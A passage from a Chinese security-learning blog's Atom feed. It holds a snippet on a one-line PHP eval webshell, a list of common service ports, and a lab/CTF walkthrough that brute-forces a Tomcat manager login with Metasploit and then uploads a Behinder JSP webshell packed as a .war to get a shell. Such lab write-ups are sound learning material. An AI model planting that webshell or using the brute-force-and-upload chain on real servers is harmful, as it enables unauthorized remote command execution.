&lt;p&gt;&lt;code&gt; &amp;lt;?php @eval($_POST[&amp;#39;cmd&amp;#39;]);?&amp;gt;&lt;/code&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运行原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;php代码写在&lt;?php </summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="Webshell" scheme="https://sinevil.github.io/tags/Webshell/"/>
    
  </entry>
  
  <entry>
    <title>port</title>
    <link href="https://sinevil.github.io/2021/07/18/port/"/>
    <id>https://sinevil.github.io/2021/07/18/port/</id>
    <published>2021-07-18T03:06:11.000Z</published>
    <updated>2021-07-27T01:27:12.363Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">常见端口汇总</span><br><span class="line">21端口：是FTP文件传输协议（控制）代理服务常用端口，用于连接</span><br><span class="line">22端口：是SSH远程登录协议的默认端口</span><br><span class="line">23端口：telnet（终端仿真协议）代理服务器常用端口</span><br><span class="line">80端口：http（超文本传输协议）用于网页浏览</span><br><span class="line">443端口：https服务，是提供加密和通过安全端口传输的另一种HTTP。</span><br><span class="line">1433端口：Microsoft的SQL服务默认端口</span><br><span class="line">1521端口：Oracle数据库默认端口</span><br><span class="line">3306端口：MySQL默认端口</span><br><span class="line">3389端口：Windows 2000远程桌面默认端口</span><br><span class="line">5432端口：PostgreSQL数据库的默认端口</span><br><span class="line">6379端口：阿里云开放的Redis的默认端口</span><br><span class="line">7001端口：Freak88，Weblogic默认端口</span><br><span class="line">7002端口：使用者&amp;组 数据库</span><br><span class="line">8080端口：www代理服务默认端口</span><br><span class="line">27017端口：MongoDB数据库默认端口</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="端口" scheme="https://sinevil.github.io/tags/%E7%AB%AF%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>tomcat弱密码爆破</title>
    <link href="https://sinevil.github.io/2021/07/15/tomcat/"/>
    <id>https://sinevil.github.io/2021/07/15/tomcat/</id>
    <published>2021-07-15T07:58:00.000Z</published>
    <updated>2021-08-03T03:29:36.184Z</updated>
    
    <content type="html"><![CDATA[<ul><li> 打开网页获取有效信息，Apache Tomcat/8.0.43及其醒目，猜测为一款软件以及他的版本号</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210716090825.png" alt="QQ截图20210716090825"></p><ul><li>不晓得tomcat是什么，百度一波</li></ul><p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。</p><ul><li>因为要渗透该靶场，所以查看一下tomcat的目录情况，深入了解tomcat的信息</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/bin  <span class="comment">#二进制文件</span></span><br><span class="line"> startup.bat      <span class="comment">#启动tomcat服务</span></span><br><span class="line"> shutdown.bat     <span class="comment">#关闭tomcat服务</span></span><br><span class="line">/conf  <span class="comment">#配置文件 </span></span><br><span class="line"> sever.xml        <span class="comment">#定义了tomcat启动时涉及的组件属性</span></span><br><span class="line"> tomcat-users.xml <span class="comment">#tomcat的用户密码和权限</span></span><br><span class="line"> web.xml          <span class="comment">#定义servlet </span></span><br><span class="line">/lib   <span class="comment">#存放全局的jar包</span></span><br><span class="line">/logs  <span class="comment">#日志</span></span><br><span class="line">/temp  <span class="comment">#临时文件</span></span><br><span class="line">/webapps  <span class="comment">#存放JAVA的WEB项目            </span></span><br><span class="line">        /manager  <span class="comment">#后台登录界面</span></span><br><span class="line">        /ROOT     <span class="comment">#根目录</span></span><br><span class="line">/work  <span class="comment">#存放jsp编译后产生的class文件</span></span><br></pre></td></tr></table></figure><ul><li>tomcat有一个后台登录界面，我们尝试访问一下，弹出登录框，我们首先想到爆破，但是可以先搜索一下tomcat有哪些漏洞可以利用</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715163504.png" alt="QQ截图20210715163504"></p><ul><li>直接搜一波tomcat的漏洞</li></ul><p><del><strong>CVE-2017-12615</strong></del></p><p><del><strong>影响版本</strong>：Tomcat 7.0.0 ～ 7.0.79</del></p><p><del><strong>影响说明</strong>：上传webshell，任意命令执行</del></p><blockquote><p>该漏洞与提供的靶场版本不符</p></blockquote><p><del><strong>CVE-2020-1938</strong></del></p><p><del><strong>影响版本</strong>:</del></p><p><del>Apache Tomcat 9.x &lt; 9.0.31</del></p><p><del>Apache Tomcat 8.x &lt; 8.5.51</del></p><p><del>Apache Tomcat 7.x &lt; 7.0.100</del> </p><p><del>Apache Tomcat 6.x</del></p><p><del><strong>影响说明</strong>：读取webapp下的所有文件</del></p><blockquote><p>未尝试</p></blockquote><p><strong>弱口令</strong></p><p><strong>影响版本</strong>：全版本</p><p><strong>环境说明</strong>：后台上传文件，getshell</p><ul><li><p>因为存在后台登录界面，介于自锁功能已经关闭，利用弱密码漏洞进行爆破</p><p>msf自带针对tomcat弱密码的爆破功能，在修改字典文档后进行爆破，得到tomcat的账号以及密码</p></li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715145404.png" alt="QQ截图20210715145404"></p><ul><li>进入tomcat的后台，发现文件上传点</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715153939.png" alt="QQ截图20210715153939"></p><ul><li>标识需要上传一个<code>.war</code>文件，将冰蝎自配的<code>.jsp</code>打包成<code>.war</code>文件后上传，上传成功</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715154059.png" alt="QQ截图20210715154059"></p><ul><li>再用连接冰蝎，获取shell，寻找flag</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715154414.png" alt="QQ截图20210715154414"></p><ul><li>在根目录下找到一个flag文件，但是flag信息为fake flag，查看主机系统为liunx，使用find命令查询所有带flag文件，最后发现只有一个flag文件，在根目录下，判断为所找的flag</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715154747.png" alt="QQ截图20210715154747"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt; 打开网页获取有效信息，Apache Tomcat/8.0.43及其醒目，猜测为一款软件以及他的版本号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210716090825.p</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="中间件漏洞" scheme="https://sinevil.github.io/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
</feed>
